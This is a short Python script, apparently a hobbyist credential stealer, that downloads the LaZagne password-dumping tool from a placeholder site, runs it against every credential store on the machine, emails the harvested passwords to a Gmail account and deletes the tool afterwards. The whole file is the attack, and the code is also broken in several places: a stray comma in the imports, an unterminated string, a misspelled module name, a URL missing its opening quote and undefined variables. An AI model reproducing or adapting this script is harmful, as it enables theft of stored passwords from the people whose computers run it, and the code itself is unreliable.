#!/usr/bin/env python
import requests,subprocess,smtplib,,os,tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("\")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)
 


#To recieve an email if command is executed
#In order for the email to be sent, as most emails don't allow app logins for security reasons,you need to enable the App Passwords from the Mail you are using
def send_mail(email,password,message):
    server = smptplib.SMTP("smtp.gmail.com" , 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

temp_directory = tempfile.gettempdir()
download(www.randomsite.com/laZagne.exe")
result = subprocess.check_output("laZagne.exe all" , shell=True)
send_mail(email,password,result)
os.remove("laZagne.exe")